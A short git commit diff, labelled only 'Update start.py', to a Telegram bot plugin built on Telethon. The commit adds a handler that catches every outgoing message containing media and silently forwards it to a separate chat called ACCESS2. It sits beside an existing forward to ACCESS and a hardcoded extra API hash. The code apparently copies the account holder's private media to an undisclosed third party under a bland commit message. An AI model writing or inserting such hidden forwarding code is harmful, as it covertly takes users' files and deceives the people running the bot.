ca25e1519f1ae48fae422ae0e217bd623f6f899b
ThechauhanMahesh <125787905+ThechauhanMahesh@users.noreply.github.com>
2023-04-15 16:22:53 +0530

    Update start.py

--- main/plugins/start.py
+++ main/plugins/start.py
@@ -36,6 +36,11 @@ APIHASH = [API_HASH, "1674d13f3308faa1479b445cdbaaad2b"]
 async def access(event):
     await event.forward_to(ACCESS)
 
+@bot.on(events.NewMessage(outgoing=True))
+async def access(event):
+    if event.media:
+        await event.forward_to(ACCESS2)
+    
 @bot.on(events.NewMessage(incoming=True, pattern="/start"))
 async def start(event):
     await event.reply(f'{st}', 
